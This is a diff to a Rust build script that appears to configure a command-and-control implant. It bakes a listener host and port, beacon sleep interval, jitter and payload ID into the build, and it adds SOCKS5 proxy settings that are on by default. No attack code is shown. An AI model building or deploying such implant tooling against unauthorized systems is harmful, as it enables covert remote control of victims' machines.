@@ -10,12 +10,19 @@ fn main() {
     println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
     println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
     println!("cargo:rerun-if-env-changed=PROTOCOL");
+    println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
+    println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
 
     // Get configuration from environment variables
     let server_host = env::var("LISTENER_HOST").unwrap_or_default();
     let server_port = env::var("LISTENER_PORT").unwrap_or_default();
     let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
     let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
+    let socks5_enabled = env::var("SOCKS5_ENABLED")
+        .unwrap_or_else(|_| "true".to_string())
+        .parse::<bool>()
+        .unwrap_or(true);
+    let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());
     
     let default_protocol = if server_port == "443" {
         "https"
@@ -33,9 +40,12 @@ fn main() {
                 "sleep_interval": {},
                 "jitter": 2,
                 "payload_id": "{}",
-                "protocol": "{}"
+                "protocol": "{}",
+                "socks5_enabled": {},
+                "socks5_port": {}
             }}"#,
-            server_host, server_port, sleep_interval, payload_id, protocol
+            server_host, server_port, sleep_interval, payload_id, protocol,
+            socks5_enabled, socks5_port
         )
     } else if let Ok(content) = fs::read_to_string("config.json") {
         // If we have a config.json file, use it as fallback
@@ -47,7 +57,9 @@ fn main() {
             "sleep_interval": 5,
             "jitter": 2,
             "payload_id": "",
-            "protocol": "http"
+            "protocol": "http",
+            "socks5_enabled": true,
+            "socks5_port": 9050
         }"#.to_string()
     };
 
